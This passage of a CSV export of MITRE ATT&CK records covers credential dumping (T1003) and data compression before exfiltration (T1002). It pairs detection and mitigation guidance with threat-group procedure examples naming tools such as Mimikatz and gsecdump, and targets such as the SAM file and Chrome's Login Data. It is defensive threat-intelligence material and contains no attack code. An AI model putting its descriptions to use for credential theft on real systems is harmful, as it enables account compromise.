Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
62,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Group/G0040|Patchwork]] dumped the login data database from <code>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code>.[[CiteRef::Cymmetria Patchwork]]'],['Patchwork'],"['Patchwork', 'Dropping Elephant', 'Chinastrats']",['G0040'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
63,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Software/S0005|Windows Credential Editor]] can dump credentials.[[CiteRef::Amplia WCE]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],"Software: Windows Credential Editor, WCE",['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
64,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Software/S0008|gsecdump]] can dump Windows password hashes and LSA secrets.[[CiteRef::TrueSec Gsecdump]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: gsecdump,['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
65,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']","['[[Software/S0002|Mimikatz]] performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from LSA, SAM table, credential vault, and DCSync.[[CiteRef::Deply Mimikatz]][[CiteRef::GitHub Mimikatz lsadump Module]]']",['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: Mimikatz,['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
66,"[""Common credential dumpers such as [[Software/S0002|Mimikatz]] access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [[Technique/T1055|DLL Injection]] to reduce potential indicators of malicious activity.\n\nNTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [[Technique/T1078|Valid Accounts]] in-use by adversaries may help as well. \n\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\n\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [[Software/S0002|Mimikatz]]. [[Technique/T1086|PowerShell]] scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[[CiteRef::Powersploit]] which may require additional logging features to be configured in the operating system to collect necessary information for analysis.""]",[],['567'],['Vincent Le Toux'],"['API monitoring', 'Process command-line parameters', 'Process monitoring', 'PowerShell logs']",['[[Group/G0027|Threat Group-3390]] actors have used [[Software/S0008|gsecdump]] and a modified version of [[Software/S0002|Mimikatz]] called Wrapikatz to dump credentials. They have also dumped credentials from domain controllers.[[CiteRef::Dell TG-3390]][[CiteRef::SecureWorks BRONZE UNION June 2017]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Monitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [[Technique/T1078|Valid Accounts]] if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.[[CiteRef::Microsoft LSA]]\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements.[[CiteRef::TechNet Credential Guard]] It also does not protect against all forms of credential dumping.[[CiteRef::GitHub SHB Credential Guard]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],['Credential Access'],['Technique/T1003'],['Credential Dumping'],https://attack.mitre.org/wiki/Technique/T1003
67,"['Compression software and compressed files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known compression utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used.\n\nIf the communications channel is unencrypted, compressed files can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers.[[CiteRef::Wikipedia File Header Signatures]]']",[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0010|Lurid]] can compress data before sending it.[[CiteRef::Villeneuve 2011]]'],['PittyTiger'],['PittyTiger'],['G0011'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to compress files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIf network intrusion prevention or data loss prevention tools are set to block specific file types from leaving the network over unencrypted channels, then an adversary may move to an encrypted channel.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: Lurid, Enfal",['Exfiltration'],['Technique/T1002'],['Data Compressed'],https://attack.mitre.org/wiki/Technique/T1002
68,"['Compression software and compressed files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known compression utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used.\n\nIf the communications channel is unencrypted, compressed files can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers.[[CiteRef::Wikipedia File Header Signatures]]']",[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['The [[Group/G0004|Ke3chang]] group has been known to compress data before exfiltration.[[CiteRef::Villeneuve et al 2014]]'],['Ke3chang'],['Ke3chang'],['G0004'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to compress files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIf network intrusion prevention or data loss prevention tools are set to block specific file types from leaving the network over unencrypted channels, then an adversary may move to an encrypted channel.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],['Technique/T1002'],['Data Compressed'],https://attack.mitre.org/wiki/Technique/T1002
69,"['Compression software and compressed files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known compression utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used.\n\nIf the communications channel is unencrypted, compressed files can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers.[[CiteRef::Wikipedia File Header Signatures]]']",[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0006|APT1]] has used RAR to compress files before moving them outside of the victim network.[[CiteRef::Mandiant APT1]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to compress files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIf network intrusion prevention or data loss prevention tools are set to block specific file types from leaving the network over unencrypted channels, then an adversary may move to an encrypted channel.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],['Technique/T1002'],['Data Compressed'],https://attack.mitre.org/wiki/Technique/T1002
70,"['Compression software and compressed files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known compression utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used.\n\nIf the communications channel is unencrypted, compressed files can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers.[[CiteRef::Wikipedia File Header Signatures]]']",[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",[u'[[Software/S0045|ADVSTORESHELL]] compresses output data generated by command execution with a custom implementation of the Lempel\u2013Ziv\u2013Welch (LZW) algorithm.[[CiteRef::ESET Sednit Part 2]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to compress files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIf network intrusion prevention or data loss prevention tools are set to block specific file types from leaving the network over unencrypted channels, then an adversary may move to an encrypted channel.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: ADVSTORESHELL, NETUI, ...",['Exfiltration'],['Technique/T1002'],['Data Compressed'],https://attack.mitre.org/wiki/Technique/T1002
71,"['Compression software and compressed files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known compression utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used.\n\nIf the communications channel is unencrypted, compressed files can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers.[[CiteRef::Wikipedia File Header Signatures]]']",[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']","['Following data collection, [[Group/G0037|FIN6]] has compressed log files into a ZIP archive prior to staging and exfiltration.[[CiteRef::FireEye FIN6 April 2016]]']",['FIN6'],['FIN6'],['G0037'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to compress files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIf network intrusion prevention or data loss prevention tools are set to block specific file types from leaving the network over unencrypted channels, then an adversary may move to an encrypted channel.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],['Technique/T1002'],['Data Compressed'],https://attack.mitre.org/wiki/Technique/T1002
72,"['Compression software and compressed files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known compression utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used.\n\nIf the communications channel is unencrypted, compressed files can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers.[[CiteRef::Wikipedia File Header Signatures]]']",[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['The [[Software/S0086|ZLib]] backdoor compresses communications using the standard Zlib compression library.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to compress files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIf network intrusion prevention or data loss prevention tools are set to block specific file types from leaving the network over unencrypted channels, then an adversary may move to an encrypted channel.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: ZLib,['Exfiltration'],['Technique/T1002'],['Data Compressed'],https://attack.mitre.org/wiki/Technique/T1002
73,"['Compression software and compressed files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known compression utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used.\n\nIf the communications channel is unencrypted, compressed files can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers.[[CiteRef::Wikipedia File Header Signatures]]']",[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0053|SeaDuke]] compressed data with zlib prior to sending it over C2.[[CiteRef::Mandiant No Easy Breach]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to compress files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIf network intrusion prevention or data loss prevention tools are set to block specific file types from leaving the network over unencrypted channels, then an adversary may move to an encrypted channel.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: SeaDuke, SeaDaddy, SeaDesk",['Exfiltration'],['Technique/T1002'],['Data Compressed'],https://attack.mitre.org/wiki/Technique/T1002
74,"['Compression software and compressed files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known compression utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used.\n\nIf the communications channel is unencrypted, compressed files can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers.[[CiteRef::Wikipedia File Header Signatures]]']",[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']","['[[Group/G0032|Lazarus Group]] malware IndiaIndia saves information gathered about the victim to a file that is compressed with Zlib, encrypted, and uploaded to a C2 server.[[CiteRef::Novetta Blockbuster Loaders]] [[Group/G0032|Lazarus Group]] malware RomeoDelta archives specified directories in .zip format, encrypts the .zip file, and uploads it to its C2 server.[[CiteRef::Novetta Blockbuster RATs]]']",['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to compress files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIf network intrusion prevention or data loss prevention tools are set to block specific file types from leaving the network over unencrypted channels, then an adversary may move to an encrypted channel.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],['Technique/T1002'],['Data Compressed'],https://attack.mitre.org/wiki/Technique/T1002
75,"['Compression software and compressed files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known compression utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used.\n\nIf the communications channel is unencrypted, compressed files can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers.[[CiteRef::Wikipedia File Header Signatures]]']",[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0045|menuPass]] has compressed files before exfiltration using TAR and RAR.[[CiteRef::PWC Cloud Hopper April 2017]][[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to compress files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIf network intrusion prevention or data loss prevention tools are set to block specific file types from leaving the network over unencrypted channels, then an adversary may move to an encrypted channel.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],['Technique/T1002'],['Data Compressed'],https://attack.mitre.org/wiki/Technique/T1002
